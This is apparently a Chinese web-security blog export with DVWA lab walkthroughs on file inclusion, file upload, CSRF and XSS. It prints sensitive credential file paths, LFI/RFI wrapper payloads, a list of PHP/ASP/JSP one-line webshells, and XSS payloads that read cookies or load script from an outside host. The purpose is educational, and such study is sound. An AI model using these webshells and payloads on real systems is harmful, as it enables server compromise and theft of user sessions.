<h2 id="常见的敏感信息路径"><a href="#常见的敏感信息路径" class="headerlink" title="常见的敏感信息路径"></a>常见的敏感信息路径</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini // 查看系统版本</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</span><br><span class="line">c:\windows\repair\sam // 存储Windows系统初次安装的密码</span><br><span class="line">c:\ProgramFiles\mysql\my.ini // MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</span><br><span class="line">c:\windows\php.ini // php 配置信息</span><br></pre></td></tr></table></figure>

<h3 id="LINUX"><a href="#LINUX" class="headerlink" title="LINUX"></a>LINUX</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd // 账户信息</span><br><span class="line">/etc/shadow // 账户密码文件</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini // PHP相关配置</span><br><span class="line">/etc/httpd/conf/httpd.conf // Apache配置文件</span><br><span class="line">/etc/my.conf // mysql 配置文件</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file://</td>
<td align="center">访问本地文件系统</td>
</tr>
<tr>
<td align="center">http://</td>
<td align="center">访问HTTP(s)网址</td>
</tr>
<tr>
<td align="center">ftp://</td>
<td align="center">访问FTP(S)URLs</td>
</tr>
<tr>
<td align="center">php://</td>
<td align="center">访问各个输入/输出流(I/O streams)</td>
</tr>
<tr>
<td align="center">zlib://</td>
<td align="center">压缩流</td>
</tr>
<tr>
<td align="center">data://</td>
<td align="center">数据</td>
</tr>
<tr>
<td align="center">glob://</td>
<td align="center">查找匹配的文件路径模式</td>
</tr>
<tr>
<td align="center">rar://</td>
<td align="center">RAR</td>
</tr>
</tbody></table>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><table>
<thead>
<tr>
<th align="center">协议</th>
<th align="center">PHP版本</th>
<th align="center">allow_url_fopen</th>
<th align="center">allow_url_include</th>
<th>用法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file://</td>
<td align="center">&gt;=5.2</td>
<td align="center">off/on</td>
<td align="center">off/on</td>
<td>?file=file://C:/phpStudy/PHPTutorial/www/phpcode.txt</td>
</tr>
<tr>
<td align="center">php://filter</td>
<td align="center">&gt;=5.2</td>
<td align="center">off/on</td>
<td align="center">off/on</td>
<td>?file=php://filter/read=convert.base64-encode/resource=./index.php</td>
</tr>
<tr>
<td align="center">php://input</td>
<td align="center">&gt;=5.2</td>
<td align="center">off/on</td>
<td align="center">on</td>
<td>?file=php://input  [POST DATA] <?php phpinfo()?></td>
</tr>
<tr>
<td align="center">compress.bzip2://</td>
<td align="center">&gt;=5.2</td>
<td align="center">off/on</td>
<td align="center">off/on</td>
<td>?file=compress.bzip2://C:/soft?phpstudy/www/file.bz2</td>
</tr>
<tr>
<td align="center">compress:zlib://</td>
<td align="center">&gt;=5.2</td>
<td align="center">off/on</td>
<td align="center">off/on</td>
<td>?file=compress.zbli://./file.gz</td>
</tr>
<tr>
<td align="center">data://</td>
<td align="center">&gt;=5.2</td>
<td align="center">on</td>
<td align="center">on</td>
<td>?file=data://text/plain,<?php phpinfo()?>  或者 ?file=data://text/plain,base64,PD9waHAgcGhwaW5mbygpPz4=</td>
</tr>
<tr>
<td align="center">zip://</td>
<td align="center">&gt;=5.2</td>
<td align="center">off/on</td>
<td align="center">off/on</td>
<td>?file=zip://D:/soft/phpstudy/www/file.zip%23phpcode.txt</td>
</tr>
</tbody></table>
<h3 id="截断后缀"><a href="#截断后缀" class="headerlink" title="截断后缀"></a>截断后缀</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#demo3.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename . <span class="string">".html"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>本地包含截断</strong></p>
<ul>
<li><code>%00</code>截断<ul>
<li><code>?filename=../../../../../../../boot.ini%00</code></li>
</ul>
</li>
<li>路径长度截断：windows OS，点号需要长于256；linux OS 长于4096Windows下目录最大长度为256字节，超出的部分会被丢弃；Linux下目录最大长度为4096字节，超出的部分会被丢弃。<ul>
<li><code>?filename=test.txt/./././././</code>(这里省略了大部分<code>./</code>)</li>
</ul>
</li>
<li>点号截断：windows OS，点号需要长于256<ul>
<li><code>?filename=test.txt...................</code>（同理这里省略了大部分<code>.</code>）</li>
</ul>
</li>
</ul>
<p><strong>远程包含阶段</strong></p>
<ul>
<li><code>?</code>号绕过<ul>
<li><code>?filename=http://192.168.1.1/php.txt?</code></li>
</ul>
</li>
<li><code>#</code>号绕过<ul>
<li><code>?filename=http://192.168.1.1/php.txt%23</code></li>
</ul>
</li>
<li>空格绕过<ul>
<li><code>?filename=http://192.168.1.1/php.txt%20</code></li>
</ul>
</li>
</ul>
<h3 id="Apache日志包含"><a href="#Apache日志包含" class="headerlink" title="Apache日志包含"></a>Apache日志包含</h3><blockquote>
<p>当访问不存在的资源时，apache日志同样会记录</p>
</blockquote>
<p>我们可以访问<code>127.0.0.1/include/&lt;?php phpinfo();?&gt;</code>然后利用文件包含漏洞包含<code>access.log文件</code></p>
<h3 id="Session包含"><a href="#Session包含" class="headerlink" title="Session包含"></a>Session包含</h3><blockquote>
<p>一般我们可以通过phpinfo()函数查看session存放的位置，session的文件名为sess+sessionid，sessionid可以通过开发者模式获取，然后通过文件包含查看session内容，通过内容来分析那些内容可以写入session中，然后通过构造payload传入到session中，从而达到漏洞利用目的。</p>
</blockquote>
<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><p><code>这里已经利用文件上传漏洞，把包含文件上传到\DVWA\hackable\uploads下</code></p>
<h3 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h3><blockquote>
<p>这里没有进行任何过滤，我们直接包含本地文件就成功了</p>
</blockquote>
<p><code>http://192.168.65.128/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.php</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597902587538.png" alt="1597902587538" title class>
                <p>1597902587538</p>
            </figure>

<h3 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h3><blockquote>
<p>这里我们和前面一样尝试没有成功，然后尝试绝对路径就成功了，因为这里过滤了<code>../和..\</code></p>
</blockquote>
<p><code>?page=C:\phpStudy\PHPTutorial\WWW\DVWA\hackable\uploads\shell.php</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597902875445.png" alt="1597902875445" title class>
                <p>1597902875445</p>
            </figure>

<h3 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h3><blockquote>
<p>这里限制了文件协议必须为file，所以我们采用file协议绕过</p>
</blockquote>
<p><code>?page=file://C:\phpStudy\PHPTutorial\WWW\DVWA\hackable\uploads\shell.php</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597903657754.png" alt="1597903657754" title class>
                <p>1597903657754</p>
            </figure>

<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
<li>尽量不要使用文件包含代码，并且关闭包含选项</li>
<li>如果必须要用文件包含，要把路径和名称写死</li>
</ol>
<hr>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[web安全-文件上传]]></title>
      <url>/2021/02/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>Author:<code>wisejay</code></p>
<p>Email:<code>wisejay@foxmail.com</code></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件，网站Web应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型，此时攻击者就可以上传一个webshell到一个Web可访问的目录上，并将恶意文件传递给如PHP解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。</p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p><strong>定义</strong></p>
<p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p>
<p><strong>特点</strong></p>
<p>WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录，没有经验的管理员不容易发现入侵痕迹。攻击者可以将WebShell隐藏在正常文件中并修改文件时间增强隐蔽性，也可以采用一些函数对WebShell进行编码或者拼接以规避检测。除此之外，通过一句话木马的小马来提交功能更强大的大马可以更容易通过应用本身的检测。<?php eval($_POST[a]); ?>就是一个最常见最原始的小马。 </p>
<h2 id="校验方法"><a href="#校验方法" class="headerlink" title="校验方法"></a>校验方法</h2><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><ol>
<li><p>通过javascript来校验上传文件的后缀是否合法，可以采用白名单，也可以采用黑名单的方式</p>
</li>
<li><p>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p>
</li>
</ol>
<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><ol>
<li>校验请求头 content-type字段MIME类型<ul>
<li>例如用PHP检测<code>if($_FILES[&#39;FILE&#39;][&#39;TYPE&#39;]!= &quot;image/gif&quot;){}</code></li>
</ul>
</li>
<li>文件内容加载检测：一般是调用API或函数去进行文件加载测试，例如图像渲染测试，当测试结果正常的时候才允许上传<ul>
<li>一次渲染：例如用PHP检测<code>if(!getimagesize($_FILES[&#39;FILE&#39;][&#39;tmp_name&#39;])){}</code></li>
</ul>
</li>
<li>后缀名黑名单校验</li>
<li>后缀名白名单校验</li>
</ol>
<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h3><ul>
<li>删除浏览器事件(或禁用JS)</li>
<li>利用burpsuite抓包修改后缀名</li>
<li>构造上传表单</li>
</ul>
<h3 id="服务端绕过"><a href="#服务端绕过" class="headerlink" title="服务端绕过"></a>服务端绕过</h3><p><strong>后缀名绕过</strong></p>
<ul>
<li>大小写绕过</li>
<li>名单列表绕过<ul>
<li>常见<code>php</code>、<code>php3</code>、<code>phtml</code></li>
</ul>
</li>
<li>windows特性<ul>
<li>末尾的点(.)：如<code>[1.php.]</code></li>
<li>空格( )：如<code>[1.php ]</code></li>
<li>::$DATA：如<code>[1.php::$DATA]</code></li>
</ul>
</li>
<li>.hatccess文件攻击</li>
<li>利用Apache文件解析</li>
</ul>
<p><strong>MIME绕过</strong></p>
<ul>
<li>抓包修改Content-Type的值<ul>
<li><code>.js</code> : <code>application/x-javascript</code></li>
<li><code>.html</code> : <code>text/html</code></li>
<li><code>.jpg</code>: <code>image/jpeg</code></li>
<li><code>.png</code> : <code>image/png</code></li>
<li><code>.pdf</code>:  <code>application/pdf</code></li>
</ul>
</li>
</ul>
<p><strong>文件内容绕过</strong></p>
<ul>
<li>在脚本文件开头补充图片对应的头部值<ul>
<li>JPG : <code>FF D8 FF E0 00 10 4A 46 49 46</code></li>
<li>GIF : <code>47 49 46 38 39 61</code></li>
<li>PNG : <code>89 50 4E 47</code></li>
</ul>
</li>
<li>二次渲染绕过<ul>
<li>先上传图片，然后下来回来查看在没有改变的插入一句话木马</li>
</ul>
</li>
<li>制作图片马<code>copy 1.jpg/b+1.php/a 2.jpg</code><ul>
<li>/b以二进制格式复制，合并文件，用于图像类/声音类</li>
<li>/a以ASCII格式复制，合并文件，用于txt等文档类文件</li>
<li><strong>图片马需要结合文件包含或者容器解析漏洞才能利用</strong></li>
</ul>
</li>
</ul>
<p><strong>00截断绕过</strong></p>
<ul>
<li>00代表结束符，PHP会把00后面的所有字符删除<ul>
<li>PHP版本小于5.3.4、<code>magic_quotes_gpc</code>为OFF</li>
<li>GET请求方式%00是被服务器解码为0x00发挥了截断作用</li>
<li>POST请求可以先用特殊符号代替，然后抓包查看修改为00</li>
</ul>
</li>
</ul>
<p><strong>条件竞争绕过</strong></p>
<ul>
<li>一些网站文件检测逻辑是先允许上传任意文件，然后检查文件是否包含可执行脚本，如果包含就删除。这样我们可以利用成功上传到删除文件的时间差，上传一个.php文件，在没有删除之前立即访问，则自动生成一个新的<code>shell.php</code>，新文件不会被删除。</li>
</ul>
<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="IIS解析漏洞-IIS-5-X-6-0"><a href="#IIS解析漏洞-IIS-5-X-6-0" class="headerlink" title="IIS解析漏洞(IIS 5.X/6.0)"></a>IIS解析漏洞(IIS 5.X/6.0)</h3><ul>
<li><p>目录解析：<code>/test.asp/1.jsp</code>解析为<code>1.asp</code></p>
<ul>
<li>在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行</li>
</ul>
</li>
<li><p>文件解析：<code>test.asp;.jpg</code> 解析为<code>test.asp</code></p>
<ul>
<li>分号后面的不被解析</li>
</ul>
</li>
</ul>
<h3 id="Nginx解析漏洞-IIS-7-0-IIS-7-5-Nginx-lt-8-03"><a href="#Nginx解析漏洞-IIS-7-0-IIS-7-5-Nginx-lt-8-03" class="headerlink" title="Nginx解析漏洞(IIS 7.0/IIS 7.5/Nginx &lt;8.03)"></a>Nginx解析漏洞(IIS 7.0/IIS 7.5/Nginx &lt;8.03)</h3><ul>
<li><p>在默认Fast-CGI开启状况上传一个名字为1.jpg访问1.jpg/1.php,在这个目录下就会生成一句话木马 shell.php</p>
<ul>
<li><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></li>
</ul>
</li>
<li><p><code>%00</code>截断：<code>test.jpg%00.php</code>解析为<code>test.php</code></p>
</li>
</ul>
<h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><p>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断</p>
<ul>
<li>当请求<code>shell.php.xxx.yyy</code><ul>
<li><code>yyy</code>后缀无法识别，向左</li>
<li><code>xxx</code>后缀无法识别，向左</li>
<li>php可以识别，执行<code>shell.php</code></li>
</ul>
</li>
</ul>
<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="一句话木马制作"><a href="#一句话木马制作" class="headerlink" title="一句话木马制作"></a>一句话木马制作</h3><ul>
<li>PHP<ul>
<li>eval函数<ul>
<li><code>&lt;?PHP eval($_REQUEST[&#39;cmd&#39;]);?&gt;</code></li>
<li><code>&lt;?PHP eval($_POST[&#39;cmd&#39;]);?&gt;</code></li>
<li><code>&lt;?PHP @eval($_POST[&#39;cmd&#39;]);?&gt;</code></li>
</ul>
</li>
<li>system函数<ul>
<li><code>&lt;?PHP system($_REQUEST[&#39;cmd&#39;]);?&gt;</code></li>
<li><code>&lt;?PHP system($_POST[&#39;cmd&#39;]);?&gt;</code></li>
</ul>
</li>
<li>shell_exec函数<ul>
<li><code>&lt;?PHP echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code></li>
</ul>
</li>
<li>assert函数<ul>
<li><code>&lt;?php @assert($_POST[&#39;cmd&#39;]);?&gt;</code></li>
<li><code>&lt;?php $item[&#39;wind&#39;] = &#39;assert&#39;; $array[] = $item; $array[0][&#39;wind&#39;](/img/文件上传/$_POST[&#39;cmd&#39;]);?&gt;</code></li>
</ul>
</li>
</ul>
</li>
<li>ASP<ul>
<li>execute函数<ul>
<li><code>&lt;%execute(request(&quot;cmd&quot;))%&gt;</code></li>
</ul>
</li>
</ul>
</li>
<li>ASPX<ul>
<li><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;cmd&quot;],&quot;unsafe&quot;);%&gt;</code></li>
</ul>
</li>
<li>JSP<ul>
<li><code>&lt;%if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt;</code></li>
</ul>
</li>
</ul>
<h3 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h3><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598022121925.png" alt="1598022121925" title class>
                <p>1598022121925</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598012888770.png" alt="1598024239309" title class>
                <p>1598024239309</p>
            </figure>

<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><h3 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h3><blockquote>
<p>直接上传一句话木马</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598024239309.png" alt="1598012840997" title class>
                <p>1598012840997</p>
            </figure>

<blockquote>
<p>没有任何过滤直接上传成功并且返回文件保存的位置</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598012840997.png" alt="1598012888770" title class>
                <p>1598012888770</p>
            </figure>

<h3 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h3><blockquote>
<p>我们依旧直接上传木马，发现无法上传要求图片格式</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598018691754.png" alt="1598013148594" title class>
                <p>1598013148594</p>
            </figure>

<blockquote>
<p>这里我们抓包修改MIME类型后再发送，这样就成功绕过上传了我们的shell.php</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598019286315.png" alt="1598018691754" title class>
                <p>1598018691754</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598018776334.png" alt="1598018776334" title class>
                <p>1598018776334</p>
            </figure>

<h3 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h3><blockquote>
<p>这里修改MIME类型也无法上传了，我们直接制作图片马上传就成功了</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598019313281.png" alt="1598019286315" title class>
                <p>1598019286315</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598013148594.png" alt="1598019313281" title class>
                <p>1598019313281</p>
            </figure>

<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
<li>文件上传的目录设置为不可执行 </li>
<li>使用随机数改写文件名和文件路径</li>
<li>最小权限运行Web服务</li>
</ol>
<hr>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[web安全-CSRF]]></title>
      <url>/2021/02/02/CSRF/</url>
      <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><blockquote>
<p>Author:<code>wisejay</code></p>
<p>Email:<code>wisejay@foxmail.com</code></p>
</blockquote>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>CSRF 即跨站请求伪造，是攻击者通过一些技术手段欺骗用户的 浏览器去访问一个自己曾经认证过的网站并执行一些操作。由于浏览器曾经认证过，所以被访问的网 站会认为是真正的用户操作而去执行。</p>
<p><strong>CSRF攻击需要同时满足以下两个条件</strong></p>
<ul>
<li>用户登录受信任网站A，并生成cookie保存在本地</li>
<li>在不登出网站A的情况下，访问危险网站B(或被恶意构造的链接)</li>
</ul>
<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略的目的：<code>防止恶意网站窃取数据</code></p>
<p>同源策略（Same origin policy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。</p>
<ul>
<li>协议相同</li>
<li>域名相同</li>
<li>端口相同</li>
</ul>
<p><strong>不同源下面三种行为会被限制</strong></p>
<ul>
<li>Cookie、LocalStorage、IndexDB无法读取</li>
<li>Dom无法获得</li>
<li>AJAX请求<code>准确来说是限制操作 ajax 响应结果</code></li>
</ul>
<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><ul>
<li>Domain：当前要添加的Cookie的域名归属，如果没有明确指定默认为当前域名</li>
<li>Path：当前要添加的Cookie的路径归属，如果没有明确指定默认为当前路径</li>
</ul>
<p><strong>Cookie作用域</strong></p>
<p>提交cookie要满足一下两点</p>
<ol>
<li>当前域名或父域名下的cookie</li>
<li>当前路径或父路径下的cookie</li>
</ol>
<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><h3 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h3><blockquote>
<p>首先我们抓取一下修改密码的数据包</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597420636366.png" alt="1597419644211" title class>
                <p>1597419644211</p>
            </figure>

<blockquote>
<p>通过分析我们找到，这里修改密码等同只发送一个GET请求，没有其他限制，这样我们可以直接构造一个GET请求payload就可以轻易更改密码啦</p>
</blockquote>
<p><code>http://192.168.65.128/dvwa/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change</code></p>
<blockquote>
<p>访问payload发现密码被修改为admin了</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597420000299.png" alt="1597420000299" title class>
                <p>1597420000299</p>
            </figure>

<h3 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h3><blockquote>
<p>这里我们直接用前面payload测试一下,发现报错,报错是英文没有定义REFERER</p>
</blockquote>
<p><code>http://192.168.65.128/dvwa/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change</code></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597419644211.png" alt="1597420317135" title class>
                <p>1597420317135</p>
            </figure>

<blockquote>
<p>我抓取正常修改时候数据包看一下情况和直接使用payload差别,发现payload缺少referer字段</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597420317135.png" alt="1597420636366" title class>
                <p>1597420636366</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597421183227.png" alt="1597420578010" title class>
                <p>1597420578010</p>
            </figure>

<blockquote>
<p>我们直接用payload抓包并自己添加主机名到referer字段发现能修改成功</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597422122860.png" alt="1597421183227" title class>
                <p>1597421183227</p>
            </figure>

<blockquote>
<p>在实际中我们可能没方法抓包修改用户的referer字段,但是我们可以构造一个假的,比如网站为1.1.1.1,我们可以在自己服务器上建立一个1.1.1.1.html,然后当用户点击时候就会自动带上1.1.1.1.html的字段绕过referer检测</p>
</blockquote>
<h3 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h3><blockquote>
<p>这里我们发现修改密码时候带上了tokne验证,所以我们无法直接实现CSRF攻击,这些我们就要结合其他漏洞一起才能利用啦,比如xss漏洞等</p>
</blockquote>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597420578010.png" alt="1597422122860" title class>
                <p>1597422122860</p>
            </figure>

<blockquote>
<p>这里的利用就不再展示啦.</p>
</blockquote>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
<li>二次认证:再次输入密码、验证码、确认弹框</li>
<li>采用token认证的方法</li>
</ol>
<hr>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[web安全-XSS]]></title>
      <url>/2021/02/01/XSS/</url>
      <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><blockquote>
<p>Author:<code>wisejay</code></p>
<p>Email:<code>wisejay@foxmail.com</code></p>
</blockquote>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>跨站脚本（cross site script，XSS），XSS 是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而把恶意代码嵌入到 web 页面中去。当别的用户访问都会执行相应的恶意代码。从而盗取用户cookie、劫持会话，钓鱼欺骗等攻击的方式。 </p>
<h2 id="常用测试语句"><a href="#常用测试语句" class="headerlink" title="常用测试语句"></a>常用测试语句</h2><ul>
<li><code>&lt;script&gt;</code>标签是最直接的 XSS 有效载荷，脚本标记可以引用外部的 JavaScript 代码，也可以将代码插入脚本标记中 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt; #弹窗xss</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;#获取cookie</span><br><span class="line">&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;#引用外部js</span><br></pre></td></tr></table></figure>

<ul>
<li><code>img</code>标签</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;#弹窗</span><br><span class="line">&lt;img src=1 onerror=document.body.appendChild(document.createElement(&apos;script&apos;)).src=&quot;http://xxx.com/xss.js&quot;&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>其他标签</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onclick=alert(&apos;xss&apos;)&gt;#点击弹窗</span><br><span class="line">&lt;input onfocus=alert(&apos;xss&apos;)&gt;#聚焦弹窗</span><br><span class="line">&lt;input onmouseover=alert(&apos;xss&apos;)&gt;#鼠标移动到指定位置弹窗</span><br><span class="line">&lt;body onload=alert(&apos;xss&apos;)&gt;#页面加载时弹窗</span><br><span class="line">&lt;a href=javascript:alert(/img/xss/1)&gt;XXX&lt;/a&gt;#点击XXX弹窗</span><br></pre></td></tr></table></figure>

<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p><code>反射型也称作非持久型，主要用于将恶意脚本插入到URL地址参数中，即每次攻击都需要用户点击，通常结合社会工程学进行攻击</code></p>
<p>正常发送信息：<code>http:127.0.0.1/xss.php?name=wisejay</code></p>
<p>反射型XSS攻击：<code>http:127.0.0.1/xss.php?name=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
<blockquote>
<p>打开者如果弹窗显示XSS，则说明存在反射型XSS</p>
</blockquote>
